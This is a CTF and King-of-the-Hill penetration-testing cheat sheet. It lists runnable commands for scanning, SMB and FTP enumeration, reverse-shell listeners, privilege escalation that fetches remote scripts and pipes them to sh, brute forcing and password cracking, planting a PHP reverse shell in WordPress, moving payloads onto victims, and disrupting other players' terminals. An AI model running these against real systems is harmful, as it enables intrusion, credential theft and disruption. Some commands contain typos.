<!--
TODO:
    add sqli stuff
    add lfi and rfi
    add stegno stuff
-->
# PFORM - CTF / KOTH - Cheatsheet<br>
### ToC - Table of Contents
- [RESOURCES](#resource)
- [RECON](#recon)
- [SMB](#smb)
    - [Mount SMB share](#smbShareMount)
    - [Map SMB shares](#mapSmbShares)
- [FTP](#ftp)
    - [FTP cheat sheet](#ftpCht)
- [RDP (Remote Desktop Protocol)](#rdp)
- [Listners](#listners)
- Reverse Shells
    - [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    - [Payload All Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
    - [RevShells.com (0day's Site)](https://www.revshells.com/)
- [Privilege escalation](#privEsc)
    - [Tools](#privEscTools)
    - [Site's to find Exploit!](#privEscSites)
    - [LinPeas](#linpeas)
    - [SUID Command's](#suidCmds)
- [Spawn TTY shell](#spawnTTY)
- [BruteForce](#bfs)
    - [Wordpress Login](#wps)
    - [SSH brute force](#sshbfs)
    - [URL get paraneter](#get)
- [Password Cracking](#passCrack)
    - [ZIP File](#zip)
    - [PGP](#pgp)
    - [SSH key](#sshkey)
- [WordPress Reverse Shell](#wpsr3v)
- [Transfer files](#tcf)
    - [HTTP](#http)
    - [SCP](#scp)
    - [NetCat](#nc)
- [King.txt](#king)
- [Random tips and triks](#tips)
    - [Change shells ip address in rush](#changeIp)
    - [Talk with other player in machine](#talk)

**For Copy/Paste commands export ip address as IP:**
```shell
export IP="10.10.10.10"
```

<h2 id="resource">RESOURCES</h2>

- [Google!](http://www.google.com)
- [CyberChef](https://gchq.github.io/CyberChef/)
- [CrackStation](https://crackstation.net/)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SQLI Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [GTFOBins](https://gtfobins.github.io/)
- [CTF Katana](https://github.com/JohnHammond/ctf-katana)
- [Magic Hashes](https://github.com/spaze/hashes)
- [RevShells (0day's Site)](https://www.revshells.com/)
- [Pentest Monkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [CVE Search](https://www.cve-search.org/)
- [Exploit DB](https://www.exploit-db.com/search)
- [1337Day](http://1337day.com)
- [ExploitSearch](http://www.exploitsearch.net)

<h2 id="recon">RECON</h2>

[**RustScan:**](https://github.com/RustScan/RustScan)
```
rustscan -A $IP`
```

[**Nmap:**](https://nmap.org/)</br>
**1.**
- No ping
- Version detection
- Default scripts
- save output

```shell
nmap -Pn -sV -sC -oN nmap.log $IP
```

**2.**
- all ports
```shell
nmap -p- $IP
```

[**Enum4linux:**](https://www.kali.org/tools/enum4linux/)
```
enum4linux $IP`
```

[**Gobuster:**](https://github.com/OJ/gobuster)
```
gobuster dir -e php,html,htm,txt,log,conf,flag -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```

[**Wfuzz:**](https://github.com/xmendez/wfuzz)
- directory discovery with Wfuzz
```shell
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c --hc 404 http://$IP/FUZZ
```

[**Nikto:**](https://github.com/sullo/nikto)
```shell
nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host $IP
```


<h2 id="smb">SMB</h2>

[**Nmap:**](https://nmap.org/)</br>
**1.**
- SMB scripts
```shell
sudo nmap --script smb-enum-shares.nse -p 445 $IP
```

**2.**
- smb scripts
- UDP
- TCP Syn scan
```shell
sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 $IP
```

[**SmbMap:**](https://github.com/ShawnDEvans/smbmap)
```shell
smbmap -H $IP
```

[**smbClient:**](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
```shell
smbclient -L \\$IP
```
```shell
smbclient -L \\$IP\C$ -U guest -W WORKGROUP
```
**Download:** `get`</br>
**Upload:** `put`

<b><h3 id="smbShareMount">Mount SMB share</h3></b>

```shell
smbmount "\\$IP\super-secret-folder" -U hacked-account -c 'mount /mnt/super-secret-folder/ -u 500 -g 100'
```

<b><h3 id="mapSmbShares">Map out smb shares</h3></b>

[**SmbMap:**](https://github.com/ShawnDEvans/smbmap)
```shell
smbmap -H $IP
```
```
smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H $IP
```

<h2 id="ftp">FTP</h2>

**Is the host vuln to anonymous login?**
> Anonymous ftp logins are usually the username 'anonymous' with the user's email address as the password.
>
> NOTE: some time password can be 'anonymous'.

```shell
ftp $IP
```

Username: `anonymous` </br>
Password: `anonymous`

Dont forget to check for hidden directories like this:

```
drwxr-xr-x pform pform 0069 Dec 32 00:00 .
drwxr-xr-x pform pform 0069 Dec 32 20:00 ..
drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <--- ( 3 dots )
drwxr-xr-x pform pform 0069 Dec 32 00:00 .myHiddenDir
-rw-r--r-x pform pform 0069 Dec 32 00:00 random-stuff.txt
```

<h3 id="ftpCht">FTP cheat sheet</h3>

**Download:** `get` or `mget *` to download all files in folder

**Upload:** `put`

**Read files:** `more`



<h2 id="rdp">RDP</h2>

> **+clipboard** makes it possible to copy from **attacker machine** to **victim machine**

```shell
xfreerdp +clipboard +window-drag /u:username /p:password /v:$IP
```

<h2>SSH</h2>

> you can specify port with `-p` if it was diffrent!

```
ssh user@$IP
```

**Login with id_rsa file:**

> `id_rsa` file is usualy on the `~/.ssh/id_rsa`
```
ssh -i id_rsa user@10.10.20.20
```


<h2 id="listners">Listners</h2>

### NetCat

```shell
nc -lnvp 1337
```

### [PwnCat](https://github.com/calebstewart/pwncat)

If you are in **Arch based** distrobution you can find pwncan in repo as `pwncat-caleb`

```shell
git clone https://github.com/calebstewart/pwncat.git && cd pwncat; python setup.py install
```

```shell
pwncat -l -p 1337
```

Download and Upload:
```
(victem) >>> pwd
/home/victem/

# CTRL + D

(Attacker) >>> download /home/victem/image.jpg
(Attacker) >>> upload ./1337H4x0r_PrivEsc_Tool

# CTRL + D

(victem) >>> ls

img.jpg
1337H4x0r_PrivEsc_Tool
```

<h2 id="privEsc">Privesc</h2>

<h3 id="privEscTools">TOOLS</h3>

- [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/PEASS-ng)
- [PentestMonkey unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
- [LES: linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- [LinEnum](https://github.com/rebootuser/LinEnum)

<h3 id="privEscSites">Sites to find Exploit!</h3>

- [CVE Search](https://www.cve-search.org/)
- [ExploitDB](http://www.exploit-db.com)
- [1337Day](http://1337day.com)
- [ExploitSearch](http://www.exploitsearch.net)
- [Metasploit Modules](http://metasploit.com/modules/)
- [Google!](http://www.google.com)

<h3 id="linpeas">LinPeas<h3>

| Method    | Command                                                                                  |
|:----------|:-----------------------------------------------------------------------------------------|
| **curl**  | `sh -c "$(curl -fsSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)"` |
| **wget**  | `sh -c "$(wget -O- https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)"`   |
| **fetch** | `sh -c "$(fetch -o - https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)"` |


<h3 id="suidCmds">SUID Commands:</h3>

```
find / -user root -perm /4000 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -type f -name '*.txt' 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid

getcap -r / 2>/dev/null
```

after you find SUID file you can use [GTFOBins](https://gtfobins.github.io/) to find ways to Privesc with that binary!


<h2 id="spawnTTY">Spawn TTY shell / Stablelize your Shell</h2>

Best Way:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# OR
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

# Ctrl + Z

stty raw -echo; fg

# ENTER
```

sh
```
/bin/sh -i
```

Parel
```
perl —e 'exec "/bin/sh";'
```

VI
```
:!bash
```

VI2
```
:set shell=/bin/bash:shell
```
<h2 id="bfs">Brute Force</h2>

<b><h3 id="wps">WordPress Login</h3></b>

[**WpScan:**](https://wpscan.com/)
```
wpscan --url http://$IP -U admin -P /opt/wordlists/rockyou.txt -t 20
```

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```


<b><h3 id="sshbfs">SSH</h3></b>

[**Hydra:**](https://github.com/vanhauser-thc/thc-hydra)
```
hydra -l username -P /user/share/wordlists/rockyou.txt ssh://$IP -p 22
```
```
hydra -v -V -u -L username -P /usr/share/rockyou.txt -t 1 -u $ip ssh
```

<b><h3 id="get">URL GET parameters brute force</h3></b>

```
ffuf -w /usr/share/rockyou.txt -u https://$IP/admin.php?username=admin&password=FUZZ -fc 100
```
ffuf filter:
```
-fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
-fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
-fr                 Filter regexp
-fs                 Filter HTTP response size. Comma separated list of sizes and ranges
-ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100
```


<h2 id="passCrack">Password Cracking</h2>

<b><h3 id="zip">ZIP</h3></b>

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myzipfile.zip
```

**Or:**


```
zip2john myzipfile.zip > ziphash.txt

john --format=PKZIP ziphash.txt

john --wordlist /opt/wordlists/rockyou.txt ziphash.txt
```

<b><h3 id="pgp">PGP-Key</h3></b>

```
gpg2john wordlist > wordlisthash-from-file</code>

john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt  wordlisthash-from-file
```

Crack sha512 (deafult unix root hash)
```
hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /usr/share/wordlists/rockyou.txt
```

<b><h3 id="sshkey">SSH key</h3></b>

```
ssh2john id_rsa_file >> extracted_hash

john extracted_hash --wordlist=/opt/wordlists/rockyou.txt
```
> Don´t foreget to chmod 600 on the id_rsa file

#### Identify your Hash

**1.**

run `hash-identifier` then put your hash

**2.**
```
john hash-file.txt
```


<h2 id="wpsr3v">Get Reverse-Shell in Wordpress</h2>

**1.**
Download PentestMonkey PHP reverse shell from [HERE](https://github.com/pentestmonkey/php-reverse-shell)

Or:

```
wget "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" > shell.php
```

Edit file and change ip and port:
```php
$ip = 'put your ip here';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```

**2.**
Create new page or edit index.php

to edit pages go to:
> Appearance > Theme Editor

<h2 id="tcf">Transfer files</h2>


<h3 id="http">Http Server</h3>
Run http server in your own machine:

```
python -m SimpleHTTPServer 1337

python3 -m http.server 1337
```
For sake of being lazy you can put:
```
alias up="python3 -m http.server 1337"
```
in your `bashrc` or `zshrc`!

then in the victem machine use:

```
export IP="Your IP"
# Wget
wget $IP/myFile.sh > myFile.sh

# curl
curl $IP/myFile.sh > myFile.sh
```

<h3 id="scp">SCP</h3>

```
scp - id_rsa ~/scripts/superprivesc0day.sh hacked-account@10.10.20.20/home/hacked-account/.hidden/privesc.sh
```

<h3 id="nc">NetCat</h3>

On receiving end:

```
nc -l 1337 > linpeas.sh
```

On sending end:

```
nc -w 3 $IP 1337 < linpeas.sh
```

If you want to transfer from attacker to victim, just swich the commands.

<h2 id="king">King.txt</h2>

what i do is something like this!
```
bash -c "while true; do echo itsnexn> king.txt; chatter +ia 'king.txt'; sleep 1; done"
```

lets simplify it!

```shell
#!/bin/bash
while true; do
    chattr -ai "king.txt"
    echo -e "username" > /root/king.txt
    chattr +ia "king.txt"
done
```

to find others shell:
```
ps -aef --forest
```
and kill:

```
kill -9 pid
```

<h2 id="tips">Random Tips and Tricks</h2>
<h3 id="changeIp">Change IP on all scripts in a folder</h3>

Go inside your shell folder:
```
export NEWIP="your ip"
grep -rl 10.10.10.10 myfile.sh | xargs sed -i 's/10.10.10.10/$NEWIP/g'
```

<h3 id="talk">Talk with other players inside machine!</h3>

#### Using Wall:
```
wall "something"
```

#### Using `/dev/pts`
for this you should find the pts number from `ps aux` or `ps -aef --forest` after that you can easily do:
```
echo "something" > /dev/pts/ # and the number
```

```
cat /dev/urandom > /dev/pts/ # and the number
```

> HACK THE PLANET | pform and Itsnexn
